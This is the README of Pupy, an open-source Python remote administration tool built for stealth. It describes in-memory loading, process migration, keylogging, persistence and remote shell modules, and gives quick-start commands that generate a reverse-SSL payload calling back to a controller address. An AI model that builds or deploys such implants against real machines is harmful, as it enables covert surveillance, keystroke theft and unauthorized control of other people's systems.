# pupy
Pupy is an opensource RAT (Remote Administration Tool) written in Python. Pupy uses reflective dll injection and leaves no traces on disk.

## Features :
- On windows, the Pupy payload is compiled as a reflective DLL and the whole python interpreter is loaded from memory. Pupy does not touch the disk :)
- Pupy can reflectively migrate into other processes
- Pupy can remotely import, from memory, pure python packages (.py, .pyc) and compiled python C extensions (.pyd). The imported python modules do not touch the disk. (.pyd mem import currently work on Windows only, .so memory import is not implemented). 
- modules are quite simple to write and pupy is easily extensible.
- Pupy uses rpyc (https://github.com/tomerfiliba/rpyc) and a module can directly access python objects on the remote client
  - we can also access remote objects interactively from the pupy shell and even auto completion of remote attributes works !
- communication channel currently works as a ssl reverse connection, but a bind payload will be implemented in the future
- all the non interactive modules can be dispatched on multiple hosts in one command
- Multi-platform (tested on windows 7, windows xp, kali linux, ubuntu)
- modules can be executed as background jobs
- commands and scripts running on remote hosts are interruptible
- auto-completion and nice colored output :-)
- commands aliases can be defined in the config

## Implemented Modules :
- migrate (windows only) 
  - inter process architecture injection also works (x86->x64 and x64->x86)
- keylogger (windows only)
- persistence (windows only)
- screenshot (windows only)
- command execution
- download
- upload
- socks5 proxy
- interactive shell (cmd.exe, /bin/sh, ...)
- interactive python shell

##Quick start
In these examples the server is running on a linux host (tested on kali linux) and it's IP address is 192.168.0.1
The clients have been tested on (Windows 7, Windows XP, kali linux, ubuntu, Mac OS X 10.10.5) 
### generate a payload
#### for Windows
```bash
./genpayload.py 192.168.0.1 -p 443 -t exe_x86 -o pupyx86.exe
```
#### for Linux
```bash
pip install rpyc #(or manually copy it if you are not admin)
python reverse_ssl.py 192.168.0.1:443
```

#### for MAC OS X
```bash
easy_install rpyc #(or manually copy it if you are not admin)
python reverse_ssl.py 192.168.0.1:443
```

### start the server
1. eventually edit pupy.conf to change the bind address / port
2. start pupysh.py
```bash
./pupysh.py
```
3. type "clients" to display connected clients

